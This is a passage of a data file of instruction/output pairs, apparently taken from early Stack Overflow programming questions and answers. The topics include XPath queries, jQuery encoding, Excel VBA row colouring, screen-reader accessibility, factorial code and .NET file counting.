needed to create the index, insert a new value, execute a sample query. Then drop the index and do the same with a GIN index. Compare the values and you will have the answer you need, based on your data."}
{"instruction": "The first time I load the website in the production web server, it start very slow, subsequent pages load very quickly (included the home page).\nI precompiled the site, but nothing changes. \nI don't have any code at Application start.\nI don't have cached items.\nAny ideas? How can I find out what is happening?", "output": "When you say \"precompile\" the site, are you using the aspnet_compiler utility to precompile, or simply using the \"Build site\" option in Visual Studio?\nIf you are not carrying out the former, I recommend giving it a spin. Coupled with Web Deployment Projects, you should have an easier time deploying your site for each release."}
{"instruction": "The first time I load the website in the production web server, it start very slow, subsequent pages load very quickly (included the home page).\nI precompiled the site, but nothing changes. \nI don't have any code at Application start.\nI don't have cached items.\nAny ideas? How can I find out what is happening?", "output": "The initial slowness is a couple things:\n\nThe appDomain is being setup\nASP.NET is parsing and compiling the ASPX pages. \nGlobal Contexts are being initialized.\n\nThis is normal behavior for ASP.NET."}
{"instruction": "Is there any way to save an object using Hibernate if there is already an object using that identifier loaded into the session?\n\nDoing session.contains(obj) seems to only return true if the session contains that exact object, not another object with the same ID.\nUsing merge(obj) throws an exception if the object is new", "output": "Have you tried calling .SaveOrUpdateCopy()? \nIt should work in all instances, if there is an entity by the same id in the session or if there is no entity at all. This is basically the catch-all method, as it converts a transient object into a persistent one (Save), updates the object if it is existing (Update) or even handles if the entity is a copy of an already existing object (Copy).\nFailing that, you may have to identify and .Evict() the existing object before Attaching (.Update()) your \"new\" object.\nThis should be easy enough to do:\nIPersistable entity = Whatever(); // This is the object we're trying to update\n// (IPersistable has an id field)\nsession.Evict(session.Get(entity.GetType(), entity.Id));\nsession.SaveOrUpdate(entity);\n\nAlthough the above code could probably do with some null checking for the .Get() call."}
{"instruction": "I'm looking for a way to get the size of an instance of a reference type. sizeof is only for value types. Is this possible?", "output": "You need Marshal.SizeOf\nEdit: This is for unsafe code, but then, so is sizeof()."}
{"instruction": "I'm looking for a way to get the size of an instance of a reference type. sizeof is only for value types. Is this possible?", "output": "Beware that Marshal.SizeOf is for unsafe code...\nI don't think it's possible for managed code though, maybe you can explain your problem, there may be another way to solve it"}
{"instruction": "I'm looking for a way to get the size of an instance of a reference type. sizeof is only for value types. Is this possible?", "output": "If you don't mind it being a little less accurate than perfect, and for comparative purposes, you could serialize the object/s and measure that (in bytes for example)\nEDIT (I kept thinking after posting): Because it's a little more complicated than sizeof for valuetypes, for example: reference types can have references to other objects and so on... there's not an exact and easy way to do it that I know of..."}
{"instruction": "In my web app, I submit some form fields with jQuery $.getJSON() Method. I am having some problems with the encoding. The character-set of my app is charset=ISO-8859-1 but I think these fields are submitted with UTF-8. \nDoes anyone know, how I can set encoding in $.getJSON calls?", "output": "I think that you'll probably have to use $.ajax() if you want to change the encoding, see the contentType param below (the success and error callbacks assume you have <div id=\"success\"></div> and <div id=\"error\"></div> in the html):\n$.ajax({\n    type: \"POST\",\n    url: \"SomePage.aspx/GetSomeObjects\",\n    contentType: \"application/json; charset=utf-8\",\n    dataType: \"json\",\n    data: \"{id: '\" + someId + \"'}\",\n    success: function(json) {\n        $(\"#success\").html(\"json.length=\" + json.length);\n        itemAddCallback(json);\n    },\n    error: function (xhr, textStatus, errorThrown) {\n        $(\"#error\").html(xhr.responseText);\n    }\n});\n\nI actually just had to do this about an hour ago, what a coincidence!"}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "Maybe a bonnet, lap or a tree is not a chair but they all are ISittable."}
{"instruction": "I have some strings of xxh:yym format where xx is hours and yy is minutes like \"05h:30m\". What is an elegant way to convert a string of this type to TimeSpan?", "output": "This seems to work, though it is a bit hackish:\nTimeSpan span;\n\n\nif (TimeSpan.TryParse(\"05h:30m\".Replace(\"m\",\"\").Replace(\"h\",\"\"), out span))\n            MessageBox.Show(span.ToString());"}
{"instruction": "I have some strings of xxh:yym format where xx is hours and yy is minutes like \"05h:30m\". What is an elegant way to convert a string of this type to TimeSpan?", "output": "Are TimeSpan.Parse and TimeSpan.TryParse not options?  If you aren't using an \"approved\" format, you'll need to do the parsing manually.  I'd probably capture your two integer values in a regular expression, and then try to parse them into integers, from there you can create a new TimeSpan with its constructor."}
{"instruction": "I have some strings of xxh:yym format where xx is hours and yy is minutes like \"05h:30m\". What is an elegant way to convert a string of this type to TimeSpan?", "output": "DateTime.ParseExact or DateTime.TryParseExact lets you specify the exact format of the input. After you get the DateTime, you can grab the DateTime.TimeOfDay which is a TimeSpan.\nIn the absence of TimeSpan.TryParseExact, I think an 'elegant' solution is out of the mix.\n@buyutec As you suspected, this method would not work if the time spans have more than 24 hours."}
{"instruction": "I have some strings of xxh:yym format where xx is hours and yy is minutes like \"05h:30m\". What is an elegant way to convert a string of this type to TimeSpan?", "output": "Here'e one possibility:\nTimeSpan.Parse(s.Remove(2, 1).Remove(5, 1));\n\nAnd if you want to make it more elegant in your code, use an extension method:\npublic static TimeSpan ToTimeSpan(this string s)\n{\n  TimeSpan t = TimeSpan.Parse(s.Remove(2, 1).Remove(5, 1));\n  return t;\n}\n\nThen you can do \n\"05h:30m\".ToTimeSpan();"}
{"instruction": "I'm using XPath in .NET to parse an XML document, along the lines of:\nXmlNodeList lotsOStuff = doc.SelectNodes(\"//stuff\");\n\nforeach (XmlNode stuff in lotsOStuff)\n{\n   XmlNode stuffChild = stuff.SelectSingleNode(\"//stuffChild\");\n   // ... etc\n}\n\nThe issue is that the XPath Query for stuffChild is always returning the child of the first stuff element, never the rest. Can XPath not be used to query against an individual XMLElement?", "output": "// at the beginning of an XPath expression starts from the document root.  Try \".//stuffChild\".  . is shorthand for self::node(), which will set the context for the search, and // is shorthand for the descendant axis.\nSo you have:\nXmlNode stuffChild = stuff.SelectSingleNode(\".//stuffChild\");\n\nwhich translates to:\nxmlNode stuffChild = stuff.SelectSingleNode(\"self::node()/descendant::stuffChild\");\nxmlNode stuffChild = stuff.SelectSingleNode(\"self::node()/descendant-or-self::stuffChild\");\n\nIn the case where the child node could have the same name as the parent, you would want to use the slightly more verbose syntax that follows, to ensure that you don't re-select the parent:\nxmlNode stuffChild = stuff.SelectSingleNode(\"self::node()/descendant::stuffChild\");\n\nAlso note that if \"stuffChild\" is a direct descendant of \"stuff\", you can completely omit the prefixes, and just select \"stuffChild\".\nXmlNode stuffChild = stuff.SelectSingleNode(\"stuffChild\");\n\nThe W3Schools tutorial has helpful info in an easy to digest format."}
{"instruction": "I'm using XPath in .NET to parse an XML document, along the lines of:\nXmlNodeList lotsOStuff = doc.SelectNodes(\"//stuff\");\n\nforeach (XmlNode stuff in lotsOStuff)\n{\n   XmlNode stuffChild = stuff.SelectSingleNode(\"//stuffChild\");\n   // ... etc\n}\n\nThe issue is that the XPath Query for stuffChild is always returning the child of the first stuff element, never the rest. Can XPath not be used to query against an individual XMLElement?", "output": "The // you use in front of stuffChild means you're looking for stuffChild elements, starting from the root.\nIf you want to start from the current node (decendants of the current node), you should use .//, as in:\nstuff.SelectSingleNode(\".//stuffChild\");"}
{"instruction": "I'm using XPath in .NET to parse an XML document, along the lines of:\nXmlNodeList lotsOStuff = doc.SelectNodes(\"//stuff\");\n\nforeach (XmlNode stuff in lotsOStuff)\n{\n   XmlNode stuffChild = stuff.SelectSingleNode(\"//stuffChild\");\n   // ... etc\n}\n\nThe issue is that the XPath Query for stuffChild is always returning the child of the first stuff element, never the rest. Can XPath not be used to query against an individual XMLElement?", "output": "If \"stuffChild\" is a child node of \"stuff\", then your xpath should just be:\nXmlNode stuffChild = stuff.SelectSingleNode(\"stuffChild\");"}
{"instruction": "I'm a web developer, and I want to make the web sites I develop more accessible to those using screen readers.  What limitations do screen readers have that I should be most aware of, and what can I do to avoid hitting these limitations.\nThis question was sparked by reading another question about non-image based captchas.  In there, a commenter said that honey pot form fields (form fields hidden with CSS that only a bot would fill in), are a bad idea, because screen readers would still pick them up. \nAre screen readers really so primitive that they would read text that isn't even displayed on the screen?  Ideally, couldn't you make a screen reader that waited until the page was finished loading, applied all css, and even ran Javascript onload functions before it figured out what was actually displayed, and then read that off to the user?  You could probably even identify parts of the page that are menus or table of contents, and give some sort of easy way for those parts to be read exclusively or skipped over. I would think that the programming community could come up with a better solution to this problem.", "output": "Are screen readers really so primitive that they would read text that isn't even displayed on the screen?\n\nWhat you have to remember is that any HTML parser doesn't read the screen - it reads the source markup. Whta you see on the screen is the browser's attempt to apply CSS to the source code. It's irrelevant.\n\nYou could probably even identify parts of the page that are menus or table of contents, and give some sort of easy way for those parts to be read exclusively or skipped over.\n\nYou could, if there were a standard for such a thing.\nI'm not very hot on the limitations of screen readers, however I've read a lot about them not being ideal. The best thing I can reccommend is to put your source in order - how you'd read it. \nThere are a set of CSS properties you should also look at for screen readers."}
{"instruction": "I'm a web developer, and I want to make the web sites I develop more accessible to those using screen readers.  What limitations do screen readers have that I should be most aware of, and what can I do to avoid hitting these limitations.\nThis question was sparked by reading another question about non-image based captchas.  In there, a commenter said that honey pot form fields (form fields hidden with CSS that only a bot would fill in), are a bad idea, because screen readers would still pick them up. \nAre screen readers really so primitive that they would read text that isn't even displayed on the screen?  Ideally, couldn't you make a screen reader that waited until the page was finished loading, applied all css, and even ran Javascript onload functions before it figured out what was actually displayed, and then read that off to the user?  You could probably even identify parts of the page that are menus or table of contents, and give some sort of easy way for those parts to be read exclusively or skipped over. I would think that the programming community could come up with a better solution to this problem.", "output": "Have a look at ARIA, it's a standard for developing accessible rich-web-client applications."}
{"instruction": "I'm a web developer, and I want to make the web sites I develop more accessible to those using screen readers.  What limitations do screen readers have that I should be most aware of, and what can I do to avoid hitting these limitations.\nThis question was sparked by reading another question about non-image based captchas.  In there, a commenter said that honey pot form fields (form fields hidden with CSS that only a bot would fill in), are a bad idea, because screen readers would still pick them up. \nAre screen readers really so primitive that they would read text that isn't even displayed on the screen?  Ideally, couldn't you make a screen reader that waited until the page was finished loading, applied all css, and even ran Javascript onload functions before it figured out what was actually displayed, and then read that off to the user?  You could probably even identify parts of the page that are menus or table of contents, and give some sort of easy way for those parts to be read exclusively or skipped over. I would think that the programming community could come up with a better solution to this problem.", "output": "How many forms just have a * or bold to indicate to a sight user that a field is required for correct submission? What's the screen reader doing? Saying \"star\"?\nBelow is an example of code that is helpful by articulating verbally but not visually. \n(note - in the example below the word \"required.\" is spoken but not seen on screen)\nIn the template:\n<label for=\"Requestor\" accesskey=\"9\"><span class=\"required\">&nbsp;Requestor&nbsp;*&nbsp;</span><span class=\"hidden\">required.</span></label>\n\nIn the CSS:\n#hidden {\n    position:absolute;\n    left:0px;\n    top:-500px;\n    width:1px;\n    height:1px;\n    overflow:hidden;\n}\n\nor\n.hidden {\n    position:absolute;\n    left:0px;\n    top:-500px;\n    width:1px;\n    height:1px;\n    overflow:hidden;\n}\n\nThere can be a whole parallel view behind the \"seen\" in every X/HTML page."}
{"instruction": "I am writing an application in Java for the desktop using the Eclipse SWT library for GUI rendering.  I think SWT helps Java get over the biggest hurdle for acceptance on the desktop: namely providing a Java application with a consistent, responsive interface that looks like that belonging to any other app on your desktop.  However, I feel that packaging an application is still an issue.  \nOS X natively provides an easy mechanism for wrapping Java apps in native application bundles, but producing an app for Windows/Linux that doesn't require the user to run an ugly batch file or click on a .jar is still a hassle.  Possibly that's not such an issue on Linux, where the user is likely to be a little more tech-savvy, but on Windows I'd like to have a regular .exe for him/her to run.\nHas anyone had any experience with any of the .exe generation tools for Java that are out there?  I've tried JSmooth but had various issues with it.  Is there a better solution before I crack out Visual Studio and roll my own?\nEdit:  I should perhaps mention that I am unable to spend a lot of money on a commercial solution.", "output": "I've used the free Launch4J to create a custom launcher for my Java programs on Windows. Combined with the free NSIS Installer you can build a nice package for your Windows users.\nEdit: Did not see that you use SWT. Don't know if it works with SWT as well, because I used only Swing in my apps."}
{"instruction": "In my web app, I submit some form fields with jQuery $.getJSON() Method. I am having some problems with the encoding. The character-set of my app is charset=ISO-8859-1 but I think these fields are submitted with UTF-8. \nDoes anyone know, how I can set encoding in $.getJSON calls?", "output": "If you want to use $.getJSON() you can add the following before the call :\n$.ajaxSetup({\n    scriptCharset: \"utf-8\",\n    contentType: \"application/json; charset=utf-8\"\n});\n\nYou can use the charset you want instead of utf-8.\nThe options are explained here.\ncontentType : When sending data to the server, use this content-type. Default is application/x-www-form-urlencoded, which is fine for most cases.\nscriptCharset : Only for requests with jsonp or script dataType and GET type. Forces the request to be interpreted as a certain charset. Only needed for charset differences between the remote and local content.\nYou may need one or both ..."}
{"instruction": "I have an Excel Spreadsheet like this\n\nid | data for id\n   | more data for id\nid | data for id\nid | data for id\n   | more data for id\n   | even more data for id\nid | data for id\n   | more data for id\nid | data for id\nid | data for id\n   | more data for id\n\nNow I want to group the data of one id by alternating the background color of the rows\n\nvar color = white\nfor each row\n    if the first cell is not empty and color is white\n        set color to green\n    if the first cell is not empty and color is green\n        set color to white\n    set background of row to color\n\nCan anyone help me with a macro or some VBA code\nThanks", "output": "If you select the Conditional Formatting menu option under the Format menu item, you will be given a dialog that lets you construct some logic to apply to that cell.\nYour logic might not be the same as your code above, it might look more like:\nCell Value is | equal to |  | and | White   .... Then choose the color.\nYou can select the add button and make the condition as large as you need."}
{"instruction": "I have an Excel Spreadsheet like this\n\nid | data for id\n   | more data for id\nid | data for id\nid | data for id\n   | more data for id\n   | even more data for id\nid | data for id\n   | more data for id\nid | data for id\nid | data for id\n   | more data for id\n\nNow I want to group the data of one id by alternating the background color of the rows\n\nvar color = white\nfor each row\n    if the first cell is not empty and color is white\n        set color to green\n    if the first cell is not empty and color is green\n        set color to white\n    set background of row to color\n\nCan anyone help me with a macro or some VBA code\nThanks", "output": "Do you have to use code?\nif the table is static, then why not use the auto formatting capability?\n\nIt may also help if you \"merge cells\" of the same data. so maybe if you merge the cells of the \"data, more data, even more data\" into one cell, you can more easily deal with classic \"each row is a row\" case."}
{"instruction": "I'm a web developer, and I want to make the web sites I develop more accessible to those using screen readers.  What limitations do screen readers have that I should be most aware of, and what can I do to avoid hitting these limitations.\nThis question was sparked by reading another question about non-image based captchas.  In there, a commenter said that honey pot form fields (form fields hidden with CSS that only a bot would fill in), are a bad idea, because screen readers would still pick them up. \nAre screen readers really so primitive that they would read text that isn't even displayed on the screen?  Ideally, couldn't you make a screen reader that waited until the page was finished loading, applied all css, and even ran Javascript onload functions before it figured out what was actually displayed, and then read that off to the user?  You could probably even identify parts of the page that are menus or table of contents, and give some sort of easy way for those parts to be read exclusively or skipped over. I would think that the programming community could come up with a better solution to this problem.", "output": "Recommended listening: Hanselminutes\nIt's an interview with a blind programmer."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Mathematica : using pure recursive functions\n(If[#>1,# #0[#-1],1])&"}
{"instruction": "I have an Excel Spreadsheet like this\n\nid | data for id\n   | more data for id\nid | data for id\nid | data for id\n   | more data for id\n   | even more data for id\nid | data for id\n   | more data for id\nid | data for id\nid | data for id\n   | more data for id\n\nNow I want to group the data of one id by alternating the background color of the rows\n\nvar color = white\nfor each row\n    if the first cell is not empty and color is white\n        set color to green\n    if the first cell is not empty and color is green\n        set color to white\n    set background of row to color\n\nCan anyone help me with a macro or some VBA code\nThanks", "output": "I think this does what you are looking for.  Flips color when the cell in column A changes value.  Runs until there is no value in column B.\nPublic Sub HighLightRows()\n    Dim i As Integer\n    i = 1\n    Dim c As Integer\n    c = 3       'red\n\n    Do While (Cells(i, 2) <> \"\")\n        If (Cells(i, 1) <> \"\") Then    'check for new ID\n            If c = 3 Then\n                c = 4   'green\n            Else\n                c = 3   'red\n            End If\n        End If\n\n        Rows(Trim(Str(i)) + \":\" + Trim(Str(i))).Interior.ColorIndex = c\n        i = i + 1\n    Loop\nEnd Sub"}
{"instruction": "I'm a web developer, and I want to make the web sites I develop more accessible to those using screen readers.  What limitations do screen readers have that I should be most aware of, and what can I do to avoid hitting these limitations.\nThis question was sparked by reading another question about non-image based captchas.  In there, a commenter said that honey pot form fields (form fields hidden with CSS that only a bot would fill in), are a bad idea, because screen readers would still pick them up. \nAre screen readers really so primitive that they would read text that isn't even displayed on the screen?  Ideally, couldn't you make a screen reader that waited until the page was finished loading, applied all css, and even ran Javascript onload functions before it figured out what was actually displayed, and then read that off to the user?  You could probably even identify parts of the page that are menus or table of contents, and give some sort of easy way for those parts to be read exclusively or skipped over. I would think that the programming community could come up with a better solution to this problem.", "output": "@robertmyers\nCSS contains the aural media type specifically to control the \"rendering\" of things when screen readers are doing their work.  So, for you example, you would only set it as visible for the aural media type.  \n\n@Ross\nI'm quite aware that the screen reader doesn't actually read the screen, but you would think that to work well, it would have to build a model of what a person with sight would see, otherwise, it seems like it would do a really poor job of getting across to the user what's actually on the page.  Also , putting things in the order you would read them doesn't really work, as a sighted person would scan the page quickly and read the section they want to read.  Do you put the contents first so that the user has to listen to them every time, or do you put them at the end so that they can get to the content first?  Also, putting content in order would mean some tricky CSS to get things positioned where you wanted them to be for sighted users.\n\nIt seems to me that most web pages contain very similar construction, and that it should be possible to, in many cases, pick out where the repeated headers and side columns are. When viewing many subsequent pages on the same site with the same formatting, it should be easy to figure out which sections are navigation, and which are content.  Doing this, the screen reader could completely skip the navigation sections, and move right onto the content, as most sighted users would do.\nI realize there are limitations, and that doing these types of things wouldn't be easy.  However, I feel like as far as screen readers go, we only did the bare minimum and left it at that."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Ruby: functional\ndef factorial(n)\n    return 1 if n == 1\n    n * factorial(n -1)\nend"}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Lua\nfunction factorial (n)\n  if (n <= 1) then return 1 end\n  return n*factorial(n-1)\nend\n\nAnd here is a stack overflow caught in the wild:\n> print (factorial(234132))\nstdin:3: stack overflow\nstack traceback:\n    stdin:3: in function 'factorial'\n    stdin:3: in function 'factorial'\n    stdin:3: in function 'factorial'\n    stdin:3: in function 'factorial'\n    stdin:3: in function 'factorial'\n    stdin:3: in function 'factorial'\n    stdin:3: in function 'factorial'\n    stdin:3: in function 'factorial'\n    stdin:3: in function 'factorial'\n    stdin:3: in function 'factorial'\n    ...\n    stdin:3: in function 'factorial'\n    stdin:3: in function 'factorial'\n    stdin:3: in function 'factorial'\n    stdin:3: in function 'factorial'\n    stdin:3: in function 'factorial'\n    stdin:3: in function 'factorial'\n    stdin:3: in function 'factorial'\n    stdin:3: in function 'factorial'\n    stdin:1: in main chunk\n    [C]: ?"}
{"instruction": "I want to compare 2 arrays of objects in JavaScript code.  The objects have 8 total properties, but each object will not have a value for each, and the arrays are never going to be any larger than 8 items each, so maybe the brute force method of traversing each and then looking at the values of the 8 properties is the easiest way to do what I want to do, but before implementing, I wanted to see if anyone had a more elegant solution. Any thoughts?", "output": "EDIT: You cannot overload operators in current, common browser-based implementations of JavaScript interpreters.\nTo answer the original question, one way you could do this, and mind you, this is a bit of a hack, simply serialize the two arrays to JSON and then compare the two JSON strings. That would simply tell you if the arrays are different, obviously you could do this to each of the objects within the arrays as well to see which ones were different.\nAnother option is to use a library which has some nice facilities for comparing objects - I use and recommend MochiKit.\n\nEDIT: The answer kamens gave deserves consideration as well, since a single function to compare two given objects would be much smaller than any library to do what I suggest (although my suggestion would certainly work well enough).\nHere is a na\u00efve implemenation that may do just enough for you - be aware that there are potential problems with this implementation:\nfunction objectsAreSame(x, y) {\n   var objectsAreSame = true;\n   for(var propertyName in x) {\n      if(x[propertyName] !== y[propertyName]) {\n         objectsAreSame = false;\n         break;\n      }\n   }\n   return objectsAreSame;\n}\n\nThe assumption is that both objects have the same exact list of properties.\nOh, and it is probably obvious that, for better or worse, I belong to the only-one-return-point camp. :)"}
{"instruction": "I'm looking for a method, or a code snippet for converting std::string to LPCWSTR", "output": "Instead of using a std::string, you could use a std::wstring.\nEDIT:  Sorry this is not more explanatory, but I have to run.\nUse std::wstring::c_str()"}
{"instruction": "I was curious about how other people use the this keyword. I tend to use it in constructors, but I may also use it throughout the class in other methods. Some examples:\nIn a constructor:\npublic Light(Vector v)\n{\n    this.dir = new Vector(v);\n}\n\nElsewhere\npublic void SomeMethod()\n{\n    Vector vec = new Vector();\n    double d = (vec * vec) - (this.radius * this.radius);\n}", "output": "I got in the habit of using it liberally in Visual C++ since doing so would trigger IntelliSense ones I hit the '>' key, and I'm lazy. (and prone to typos)\nBut I've continued to use it, since I find it handy to see that I'm calling a member function rather than a global function."}
{"instruction": "I'm looking for a method, or a code snippet for converting std::string to LPCWSTR", "output": "If you are in an ATL/MFC environment, You can use the ATL conversion macro:\n#include <atlbase.h>\n#include <atlconv.h>\n\n. . .\n\nstring myStr(\"My string\");\nCA2W unicodeStr(myStr);\n\nYou can then use unicodeStr as an LPCWSTR.  The memory for the unicode string is created on the stack and released then the destructor for unicodeStr executes."}
{"instruction": "I'm looking for a method, or a code snippet for converting std::string to LPCWSTR", "output": "Thanks for the link to the MSDN article. This is exactly what I was looking for.\nstd::wstring s2ws(const std::string& s)\n{\n    int len;\n    int slength = (int)s.length() + 1;\n    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0); \n    wchar_t* buf = new wchar_t[len];\n    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);\n    std::wstring r(buf);\n    delete[] buf;\n    return r;\n}\n\nstd::wstring stemp = s2ws(myString);\nLPCWSTR result = stemp.c_str();"}
{"instruction": "In Java 5 and above you have the foreach loop, which works magically on anything that implements Iterable:\nfor (Object o : list) {\n  doStuff(o);\n}\n\nHowever, Enumerable still does not implement Iterable, meaning that to iterate over an Enumeration you must do the following:\nfor(; e.hasMoreElements() ;) {\n  doStuff(e.nextElement());\n}\n\nDoes anyone know if there is a reason why Enumeration still does not implement Iterable?\nEdit: As a clarification, I'm not talking about the language concept of an enum, I'm talking a Java-specific class in the Java API called 'Enumeration'.", "output": "Enumeration hasn't been modified to support Iterable because it's an interface not a concrete class (like Vector, which was modifed to support the Collections interface).\nIf Enumeration was changed to support Iterable it would break a bunch of people's code."}
{"instruction": "In Java 5 and above you have the foreach loop, which works magically on anything that implements Iterable:\nfor (Object o : list) {\n  doStuff(o);\n}\n\nHowever, Enumerable still does not implement Iterable, meaning that to iterate over an Enumeration you must do the following:\nfor(; e.hasMoreElements() ;) {\n  doStuff(e.nextElement());\n}\n\nDoes anyone know if there is a reason why Enumeration still does not implement Iterable?\nEdit: As a clarification, I'm not talking about the language concept of an enum, I'm talking a Java-specific class in the Java API called 'Enumeration'.", "output": "AFAIK Enumeration is kinda \"deprecated\":\n\nIterator takes the place of\n  Enumeration in the Java collections\n  framework\n\nI hope they'll change the Servlet API with JSR 315 to use Iterator instead of Enumeration."}
{"instruction": "Is there a way to find the number of files of a specific type without having to loop through all results inn a Directory.GetFiles() or similar method? I am looking for something like this:\nint ComponentCount = MagicFindFileCount(@\"c:\\windows\\system32\", \"*.dll\");\n\nI know that I can make a recursive function to call Directory.GetFiles , but it would be much cleaner if I could do this without all the iterating.\nEDIT: If it is not possible to do this without recursing and iterating yourself, what would be the best way to do it?", "output": "Someone has to do the iterating part.\nAFAIK, there is no such method present in .NET already, so I guess that someone has to be you."}
{"instruction": "Is there a way to find the number of files of a specific type without having to loop through all results inn a Directory.GetFiles() or similar method? I am looking for something like this:\nint ComponentCount = MagicFindFileCount(@\"c:\\windows\\system32\", \"*.dll\");\n\nI know that I can make a recursive function to call Directory.GetFiles , but it would be much cleaner if I could do this without all the iterating.\nEDIT: If it is not possible to do this without recursing and iterating yourself, what would be the best way to do it?", "output": "You should use the Directory.GetFiles(path, searchPattern, SearchOption) overload of Directory.GetFiles().\nPath specifies the path, searchPattern specifies your wildcards (e.g., *, *.format) and SearchOption provides the option to include subdirectories.\nThe Length property of the return array of this search will provide the proper file count for your particular search pattern and option:\nstring[] files = directory.GetFiles(@\"c:\\windows\\system32\", \"*.dll\", SearchOption.AllDirectories);\n\nreturn files.Length;\n\nEDIT: Alternatively you can use Directory.EnumerateFiles method\nreturn Directory.EnumerateFiles(@\"c:\\windows\\system32\", \"*.dll\", SearchOption.AllDirectories).Count();"}
{"instruction": "Is there a way to find the number of files of a specific type without having to loop through all results inn a Directory.GetFiles() or similar method? I am looking for something like this:\nint ComponentCount = MagicFindFileCount(@\"c:\\windows\\system32\", \"*.dll\");\n\nI know that I can make a recursive function to call Directory.GetFiles , but it would be much cleaner if I could do this without all the iterating.\nEDIT: If it is not possible to do this without recursing and iterating yourself, what would be the best way to do it?", "output": "You can use this overload of GetFiles:\n\n Directory.GetFiles Method (String,\n   String, SearchOption)\n\nand this member of SearchOption:\n\nAllDirectories - Includes the current\n  directory and all the subdirectories\n  in a search operation. This option\n  includes reparse points like mounted\n  drives and symbolic links in the\n  search.\n\nGetFiles returns an array of string so you can just get the Length which is the number of files found."}
{"instruction": "Is there a way to find the number of files of a specific type without having to loop through all results inn a Directory.GetFiles() or similar method? I am looking for something like this:\nint ComponentCount = MagicFindFileCount(@\"c:\\windows\\system32\", \"*.dll\");\n\nI know that I can make a recursive function to call Directory.GetFiles , but it would be much cleaner if I could do this without all the iterating.\nEDIT: If it is not possible to do this without recursing and iterating yourself, what would be the best way to do it?", "output": "Using recursion your MagicFindFileCount would look like this:\nprivate int MagicFindFileCount( string strDirectory, string strFilter ) {\n     int nFiles = Directory.GetFiles( strDirectory, strFilter ).Length;\n\n     foreach( String dir in Directory.GetDirectories( strDirectory ) ) {\n        nFiles += GetNumberOfFiles(dir, strFilter);\n     }\n\n     return nFiles;\n  }\n\nThough Jon's solution might be the better one."}
{"instruction": "As part of our product release we ship Apache HTTP Server binaries that we have compiled on our (UNIX) development machine.\nWe tell our clients to install the binaries (on their UNIX servers) under the same directory structure that we compiled it under. For some clients this is not appropriate, e.g. where there are restrictions on where they can install software on their servers and they don't want to compile Apache themselves.\nIs there a way of compiling Apache HTTP Server so its installation location(s) can be specified dynamically using environment variables ?\nI spent a few days trying to sort this out and couldn't find a way to do it. It led me to believe that the Apache binaries were hard coding some directory paths at compilation preventing the portability we require.\nHas anyone managed to do this ?", "output": "I think the way to do(get around) this problem is to develop a \"./configure && make\" script that your client uses to install, specify and compile the binaries. That would offcourse require that the client has all the source-code installed on his server or you can make it available on an NFS share.\n\nNot to mention a complete build toolchain. These days, GCC doesn't come default with most major distributions. Wouldn't it be sane to force the client to install it to /opt/my_apache2/ or something like that?"}
